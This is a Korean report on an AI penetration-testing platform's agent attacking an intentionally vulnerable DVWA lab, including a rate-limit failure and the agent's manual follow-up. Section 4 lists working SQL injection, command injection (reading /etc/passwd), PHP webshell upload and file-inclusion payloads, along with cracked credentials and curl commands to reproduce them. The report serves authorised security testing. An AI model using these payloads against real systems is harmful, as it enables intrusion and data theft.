# ARTEX 자율 침투 테스트 콘솔 — DVWA 모의해킹 테스트 보고서

> 본 보고서는 **ARTEX 플랫폼의 대화(Auto Agent) 흐름을 중심으로** 테스트용 DVWA 사이트
> (`http://100.11.*.*`)에 대한 모의해킹 과정을 정리한 것입니다. 대상 DVWA는 보안
> 교육·검증 전용으로 구축된 의도적 취약 환경이며, 본 테스트의 1차 목적은 ARTEX의
> **작업 생성 → 워커 실행 → 트레이스 추적 → 발견 등록** 오케스트레이션 로직 검증입니다.

---

## 1. 개요

| 항목 | 내용 |
|------|------|
| 테스트 일시 | 2026-10-04 19:41 ~ 19:42 (KST) / 수동 인계 수행 10:50 ~ 10:56 (UTC) |
| 대상 사이트 | `http://100.11.*.*` (테스트용 DVWA v1.10 *Development*) |
| 대상 스택 | Apache/2.4.25 (Debian) · PHP · MySQL · 보안레벨 **low** |
| 목적 | ARTEX 구동 로직·기능 검증을 위한 모의해킹 실행 및 전 과정 기록 |
| 작업 ID | Task #1 — "DVWA 모의해킹 - ARTEX 로직/기능 테스트" |
| 수행 주체 | ARTEX 운영 도우미 **Auto** (대화 Agent) + 작업엔진 워커 |
| 사용 모델 | 기본 (OpenRouter GLM 5.3 Flash / nemotron-3) |
| 작업엔진 결과 | **중단(`model_error`)** — 무료 모델 분당 레이트 리밋(429) 초과 |
| 최종 수행 | 작업엔진 장애로 **Auto 대화가 직접 수동 테스트 수행** → 12종 취약점 확정 |

본 테스트는 두 단계로 전개되었다.

1. **ARTEX 자동 오케스트레이션 단계** — 사용자가 Auto 대화에 모의해킹을 지시하자, Auto는
   `spawn_task`로 작업을 생성하고 워커를 기동시켜 자동 정찰·로그인까지 진행했다.
2. **수동 인계 단계** — 작업엔진 워커가 LLM 레이트 리밋(429)으로 중단되자, Auto 대화가
   직접 도구(Bash/curl)로 전 취약점 모듈을 전수 테스트하고 발견 사항을 작업으로 인계했다.

즉, 이번 세션은 ARTEX의 오케스트레이션 흐름과 더불어 **엔진 장애 시 대화 레이어가
수동으로 작업을 완수하는 복원력(resilience)** 까지 함께 검증한 사례이다.

---

## 2. ARTEX 플랫폼 구성 (콘솔 기준)

테스트가 수행된 ARTEX 콘솔(`버전 · dev`)은 다음 기능/시스템 메뉴로 구성된다.

**기능**
- **대시보드** — 활성 작업, 확정 발견(심각/높음/중간/낮음), 자산 노드, 트래픽 교환, LLM Token 사용량을 실시간 집계
- **대화** — Auto 등 Agent와의 대화형 작업 지시·추적 (본 테스트의 중심)
- **작업 / 발견 / 트래픽 / 도구 실행 / LLM 녹화 / 자산 / 자산 동기화 / 워크스페이스**

**시스템**
- **LLM / Agent / MCP / Skill / 도구 / 알림 푸시**

테스트 종료 시점의 대시보드 집계(개요)는 다음과 같다.

| 지표 | 값 | 비고 |
|------|-----|------|
| 활성 작업 | 0 / 2 | 일시정지 2 |
| 확정 발견 | 0 | 심각/높음/중간/낮음 전부 0 — 발견 **정식 등록 전**(인계 힌트 상태) |
| 자산 노드 | 3 | 작업 간 공유 (서비스 id=3 등록됨) |
| 트래픽 교환 | 0 | 캡처 꺼짐 |
| Token 사용량 | 5.1M | 입력 5.0M(캐시 3.4M 포함) · 출력 56.6k · 캐시 히트율 68% |

> **핵심 관찰**: 대시보드의 "확정 발견 0"은 취약점이 없었다는 뜻이 **아니라**, 수동으로
> 발견한 12종이 아직 `report_finding`으로 정식 등록되지 않고 `add_task_hint`(작업 2,
> hint id 7~10)로 **인계 대기 상태**임을 의미한다. 작업엔진 쿼터 리셋 후 planner가
> 힌트를 읽어 정식 등록하도록 설계되어 있다.

---

## 3. ARTEX 대화(Auto) 흐름 — 본론

사용자는 Auto 대화 세션("테스트용 DVWA사이트 모의해킹")에 다음을 지시했다.

> **http://100.11.*.* 이 사이트는 테스트용 DVWA 사이트로 ARTEX 돌아가는 로직과 기능을
> 테스트하기 위해 모의해킹을 진행하라. 작업은 녹화하고 사용하는 도구 등 기록도 잘 하라.**

요청의 핵심은 ① 테스트용 DVWA 대상, ② ARTEX 구동 로직·기능 검증, ③ 작업 녹화 및
도구·과정 기록이다. 이에 Auto 대화는 아래 순서로 플랫폼 도구를 호출했다.

### 3.1 작업 오케스트레이션 타임라인 (Auto 대화 → 작업엔진)

| # | 도구 호출 | 판단 / 내용 | 결과 |
|---|-----------|-------------|------|
| 1 | `list_tasks {}` | 기존 작업 유무 확인 | 기존 작업 없음 → 신규 생성 결정 |
| 2 | `spawn_task {...}` | DVWA 종합 모의해킹 작업 생성 (`seed_first_intent: true`) | ✓ **Task #1 생성** |
| 3 | `sleep {5s}` | 워커 기동 대기 | ✓ |
| 4 | `get_task_graph {task_id:1}` | 작업 그래프 확인 | ✓ 열린 의도(intent) 존재 |
| 5 | `list_task_worker_traces {task_id:1}` | 워커 트레이스 조회 | ✓ 아직 없음 |
| 6 | `sleep {10s}` | 워커 실행 대기 | ✓ |
| 7 | `list_task_worker_traces {task_id:1}` | 워커 트레이스 재조회 | ✓ 워커 실행 중 |
| 8 | `get_task_worker_trace {intent_id:2}` | 워커 동작 확인 | ✓ 초기 정찰(reconnaissance) 수행 |
| 9 | `sleep {15s}` | 진행 대기 | ✓ |
| 10 | `get_task_worker_trace {intent_id:2}` | 진행 상황 재확인 | ✓ DVWA 로그인 시도 중(오류 정황) |
| 11 | `get_task_worker_trace {intent_id:2, step_ids:[15,16,19,20,23,24,27,28,30]}` | 로그인 실패 세부 확인 | ✓ |
| 12 | `get_task_graph {task_id:1}` | 발견·사실(fact) 확인 | ✓ 여전히 실행 중 |
| 13 | `get_task_worker_trace {intent_id:2, step_ids:[24,27,28,30]}` | 남은 단계 확인 | ✓ (중단 전 마지막 도구) |

### 3.2 생성된 작업 정의 (`spawn_task`)

```json
{
  "goal": "http://100.11.*.* DVWA 사이트에 대한 종합적인 모의해킹 수행. ARTEX 관련 로직과 기능을 중심으로 취약점 탐색, 익스플로잇, 검증을 수행하고 모든 도구 사용 내역과 과정을 기록한다.",
  "seed_first_intent": true,
  "description": "DVWA 모의해킹 - ARTEX 로직/기능 테스트"
}
```

워커는 `spawn_task`로 생성된 **의도(intent) 2**를 받아 초기 정찰 → DVWA 로그인 폼
접근(`user_token` hidden 필드 인지)까지 정상 진입했다. 즉 **작업 생성 → 워커 기동 →
트레이스 추적 → 그래프 조회의 오케스트레이션 흐름은 정상 동작**함을 Auto 대화가 실시간
트레이스 조회로 확인했다.

### 3.3 작업엔진 중단 — 레이트 리밋 장애

| 항목 | 내용 |
|------|------|
| 종료 상태 | `model_error` — 재시도 소진 후 해당 의도 `blocked` 처리 |
| 중단 전 마지막 도구 | `get_task_worker_trace` (정상 반환) |
| 소요 | 1분 48초 (모델 회합 14 라운드) |
| 토큰 | 입력 198,526 / 출력 969 / 캐시 읽기 60,480 |

하위 계층 오류(원문):

```
openai: status 429: Rate limit exceeded: free-models-per-min.
  X-RateLimit-Limit: 20
  X-RateLimit-Remaining: 0
  limit_source: openrouter_free_tier_per_minute
  remedy_hint: Slow down requests to free models, or retry after the per-minute window resets.
```

**해석**: 무료 티어 모델(nemotron-3)의 **분당 요청 한도(20회/분)** 초과로 HTTP 429가
발생했고, 재시도 소진 후 워커가 중단되었다. **모의해킹 로직 자체의 결함이 아니라 모델
공급자의 레이트 리밋**이 원인이다. 이 지점에서 ARTEX는 종료 상태를 `model_error`로
명확히 분류하고, "전송 계층 장애로 이 의도는 제대로 탐색되지 못함 → 재파견 또는 수법
변경 필요"라는 진단 메시지를 남겨 **장애 원인과 복구 경로를 구분**하는 로직이 정상
동작함을 보였다.

### 3.4 Auto 대화의 수동 인계 (복원력 검증)

작업엔진이 중단되자 Auto 대화는 작업을 포기하지 않고 **직접 Bash/curl 도구로 전
취약점 모듈을 수동 전수 테스트**했다. 이때 사용한 플랫폼/실행 도구 내역은 다음과 같다.

| 도구 | 용도 | 횟수 |
|------|------|------|
| Bash + curl | 전 취약점 테스트(요청 전송/응답 캡처/파싱) | 14회 배치 실행 |
| WebFetch (워커) | 초기 페이지 확인 | 1회 |
| `insert_assets` (플랫폼) | 자산 등록(서비스 id=3) | 1회 |
| `report_finding` (플랫폼) | 취약점 등록 시도 → 작업 컨텍스트 필요로 실패 | 5회 시도 |
| `add_task_hint` (플랫폼) | 취약점 15건을 작업 2에 인계(hint id 7~10) | 1회(배치) |
| `list_tasks` / `spawn_task` / `get_task_graph` / `get_task_worker_trace` / `list_task_worker_traces` / `pause_task` / `list_llm_profiles` | 작업 오케스트레이션·장애 진단 | 다수 |
| Write | 로그·보고서 작성 | 2회 |

> **설계적 관찰**: `report_finding`은 **작업(intent) 컨텍스트가 있어야** 호출되도록
> 설계되어 있어, 대화 레이어의 수동 수행분은 직접 등록되지 않았다. Auto는 이를
> `add_task_hint`로 우회하여 발견 15건을 작업 2에 인계했고, 쿼터 리셋 후 planner가
> 정식 `report_finding`을 수행하도록 체인을 구성했다. 이는 ARTEX의 **발견 등록 경로가
> 작업 소유권에 묶여 있다**는 구조를 드러낸다.

---

## 4. 수동 수행으로 확정된 모의해킹 결과

Auto 대화의 수동 전수 테스트에서 **13개 모듈 전수, 12종 취약점(총 15건)** 을 확정했다.
가장 심각한 공격 체인은 다음과 같다.

- `SQLi → DB 계정+해시 덤프 → 크랙 → 관리자/일반계정 로그인 재현`
- `파일업로드 / 명령인젝션 → www-data 권한 RCE`

### 4.1 확정 취약점 목록

| # | 취약점 | 등급 | 핵심 증거 |
|---|--------|------|-----------|
| 1 | SQL Injection — users 전체 덤프/인증우회 | **Critical** | `' UNION SELECT user,password FROM users -- ` → 5계정 MD5, 크랙 검증, gordonb 실로그인 |
| 2 | Command Injection → RCE | **Critical** | `ip=127.0.0.1;cat /etc/passwd`, `;id` → uid=33(www-data) |
| 3 | Unrestricted File Upload → RCE | **Critical** | PHP 웹셸 업로드 성공 → `/hackable/uploads/…?cmd=id` → www-data |
| 4 | File Inclusion (LFI + `php://filter` 소스유출) | High | `/etc/passwd` 열람, index.php 소스 base64 유출 |
| 5 | Blind SQL Injection (시간기반) | High | `SLEEP(5)` → 5.003s vs 0.003s |
| 6 | Stored XSS | High | 방명록에 `<script>` 영구 저장 |
| 7 | Reflected XSS | Medium | name 파라미터 원문 반사 |
| 8 | DOM XSS | Medium | `document.write` 무새니제이션 |
| 9 | CSRF (비밀번호 변경) | Medium | 토큰/현비밀번호 검증 없이 GET으로 변경 완료 |
| 10 | Weak Session ID | Medium | `dvwaSession=1,2,3` 순차 예측가능 |
| 11 | Brute Force 무차단 | Medium | 실패 5회 무차단/무지연, admin:password 유효 |
| 12 | CSP Bypass | Medium | `script-src`에 pastebin.com 등 신뢰불가 소스 허용 |
| 13 | JS 클라이언트 토큰 변조 | Medium | `phrase=success` + `md5(rot13)` 포지 → "Well done!" |
| 14 | 디렉터리 리스팅 | Low | `/vulnerabilities/`, `/hackable/uploads/` Index 노출 |
| 15 | 설정정보/경로 노출 | Low | captcha 모듈이 `config.inc.php` 절대경로 노출 |

### 4.2 크랙된 계정 (SQLi → 크랙 → 로그인 체인 검증 완료)

- `admin / password` · `gordonb / abc123`(로그인 재현 성공) · `1337 / charley` ·
  `pablo / letmein` · `smithy / password`
- 무솔트 MD5 저장 → 저장소 유출 시 즉시 탈취 가능

### 4.3 재현용 핵심 명령 (발췌)

```bash
# 로그인 (CSRF 토큰 필요)
TOKEN=$(grep -oP "user_token' value='\K[a-f0-9]+" login_page.html)
curl -s -b c.txt -c c.txt -X POST http://100.11.*.*/login.php \
  -d "username=admin&password=password&user_token=$TOKEN&Login=Login"

# SQLi UNION 덤프
curl -s -b c.txt "http://100.11.*.*/vulnerabilities/sqli/?id=%27+UNION+SELECT+user%2Cpassword+FROM+users+--%20&Submit=Submit"

# Command Injection
curl -s -b c.txt -X POST http://100.11.*.*/vulnerabilities/exec/ \
  -d "ip=127.0.0.1%3Bcat%20%2Fetc%2Fpasswd&Submit=Submit"
```

> 업로드된 웹셸은 테스트 사이트 특성상 제거하지 않았으며(삭제 가능), 증거 원본은
> `/app/data/sessions/conv-1/dvwa_evidence/`에 요청/응답 HTML로 보관되어 있다.

---

## 5. ARTEX 로직·기능 검증 평가

이번 세션의 **1차 목적인 ARTEX 구동 로직·기능 검증** 관점의 결과를 정리한다.

### 5.1 정상 동작 확인된 로직

| 기능 | 검증 결과 |
|------|-----------|
| 작업 생성 (`spawn_task`, `seed_first_intent`) | ✓ Task #1 + 의도 2 정상 생성 |
| 워커 기동 / 실행 | ✓ 초기 정찰 → DVWA 로그인 단계까지 자동 진입 |
| 트레이스 추적 (`get_task_worker_trace`, step_ids 필터) | ✓ 단계별 세부 조회 정상 |
| 작업 그래프 조회 (`get_task_graph`) | ✓ 열린 의도/사실 반영 |
| 장애 분류 (`model_error` vs 로직 결함) | ✓ 429를 전송 계층 장애로 정확히 구분 |
| 자산 등록 (`insert_assets`) | ✓ 서비스 id=3 등록, 작업 간 공유(자산 노드 3) |
| 발견 인계 (`add_task_hint`) | ✓ 15건을 작업 2에 인계(hint id 7~10) |
| 대화 레이어 수동 복원 | ✓ 엔진 중단 후 Auto가 전 모듈 수동 완수 |

### 5.2 한계 / 미검증 영역

- 레이트 리밋으로 **작업엔진 워커의 로그인 이후 자동 익스플로잇·검증 단계는 미수행**
  되었다. 해당 공격 실행/결과 검증 로직은 이번 세션에서 자동 경로로는 검증되지 못했고,
  Auto 대화의 수동 수행으로 대체되었다.
- 수동 발견 15건이 `report_finding` 정식 등록이 아닌 **힌트 인계 상태**에 머물러,
  대시보드 "확정 발견"은 0으로 표시된다(발견 데이터 파이프라인 종단 검증 미완).

### 5.3 권장 후속 조치 (플랫폼)

1. **모델 변경 / 쿼터 확보** — 무료 티어 대신 분당 한도가 넉넉한 유료·전용 모델로
   전환하거나, OpenRouter 크레딧 충전(약 10 credits) 후 작업 2 재개(paused 해제).
2. **재시도 간격 조정** — 분당 창 초기화 후 재파견, 또는 요청 속도 제한(throttle) 적용.
3. **발견 정식 등록** — 쿼터 리셋(2026-10-05 00:00 UTC) 후 작업 2 planner가 인계
   힌트(id 7~10)를 읽어 `report_finding`으로 등록하여 대시보드 "확정 발견" 집계 반영.
4. **재파견 범위** — 로그인 성공 지점부터 이어서 자동 익스플로잇 로직을 재검증.

---

## 6. 대상 보안 권고 (DVWA 맥락, 일반 권고)

1. **SQLi** — PDO prepared statement 사용(impossible 레벨 참고)
2. **명령인젝션** — `shell_exec` 금지, `escapeshellarg` + 화이트리스트 검증
3. **업로드** — 확장자/MIME/내용 3중 검증, 웹루트 밖 저장, 실행권한 제거, 리스팅 Off
4. **LFI** — `basename()` + 화이트리스트, `allow_url_include` Off 유지
5. **XSS** — 출력 시 `htmlspecialchars(ENT_QUOTES)` 전면 적용, CSP 외부 소스 제거
6. **CSRF/세션** — 비밀번호 변경에 현재 비밀번호+토큰 요구, 세션 토큰 CSPRNG, 로그인 실패 제한
7. **패스워드 저장** — bcrypt/argon2 적용, 무솔트 MD5 금지
8. **서버 설정** — 디렉터리 리스팅 비활성화(Apache `Options -Indexes`)

---

## 7. 결론

이번 세션은 ARTEX가 **대화 지시 → 작업 생성 → 워커 자동 실행 → 트레이스/그래프 추적**의
오케스트레이션 흐름을 정상 수행함을 확인했다. 작업엔진이 무료 모델 레이트 리밋(429)으로
중단되는 장애가 발생했으나, ARTEX는 이를 `model_error`로 정확히 분류했고, **Auto 대화
레이어가 수동으로 전 취약점 모듈을 완수**하여 12종 취약점(총 15건, Critical 3건 포함)을
확정·인계했다. 즉 ARTEX의 핵심 로직은 정상 동작하며, 엔진 장애 시에도 대화 레이어를 통한
복원력이 확보됨을 입증했다. 남은 과제는 **모델 쿼터 확보 후 자동 익스플로잇 단계 재검증과
발견 정식 등록(`report_finding`) 종단 파이프라인 완결**이다.

---

*본 문서는 ARTEX 콘솔의 테스트 세션 로그(`pentest_log.md`, `pentest_report.md`,
ARTEX 세션 로그)와 콘솔 스크린샷을 근거로, Auto 대화 흐름을 중심으로 정리한
보고서입니다. 대상 DVWA는 보안 교육·검증 전용 환경입니다.*
